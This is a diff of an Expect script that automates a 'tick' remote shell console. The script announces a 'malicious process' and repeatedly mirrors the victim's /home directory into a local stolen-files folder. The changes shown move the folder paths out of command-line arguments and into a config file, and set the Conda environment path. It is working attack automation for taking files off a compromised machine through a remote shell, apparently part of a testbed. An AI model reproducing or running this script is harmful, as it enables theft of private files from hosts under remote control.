@@ -1,15 +1,31 @@
 #!/usr/bin/expect -f
 
+
+############# CONFIGURATION ##########################
+
+# load the variables passed to the file
+set current_config [lindex $argv 0]
+
+
+# folder path of current file
+set SCRIPT_DIR [file dirname [file normalize $argv0]]
+set CONFIG_FOLDER_PATH "$SCRIPT_DIR/../config"
+
+# load folder paths
+set tick_remote_shell_folder [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$tick_remote_shell_folder"]
+set stolen_foles_storage_folder [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$stolen_files_storage_folder"]
+set client_config_folder [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$client_config_folder"]
+set anaconda_path [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$anaconda_location"]
+
+######################################################
+
+
+
 puts "\r** START MALICIOUS PROCESS **\r\r"
-
-set stolen_files_folder_location [lindex $argv 0]
-set tick_remote_shell_folder [lindex $argv 1]
-set client_config_folder [lindex $argv 2]
-
 
 # Activate the Conda environment within Expect
 spawn bash 
-send "source ~/anaconda3/bin/activate py27\r"
+send "source $anaconda_path/activate py27\r"
 expect "$ "
 
 # start tick console
@@ -121,10 +137,10 @@ while {1 > 0} {
  	# the malicious behavior starts stealing data in the '/home' directory
 	# to store the data the folders are mirrored on the server
 	set starting_folder "/home"
-	set first_stolen_folder $stolen_files_folder_location$starting_folder
+	set first_stolen_folder $stolen_files_storage_folder$starting_folder
 	file mkdir $first_stolen_folder
 	
 	# start malicious behavior
-	traverse $starting_folder $stolen_files_folder_location
+	traverse $starting_folder $stolen_files_storage_folder
 }
 
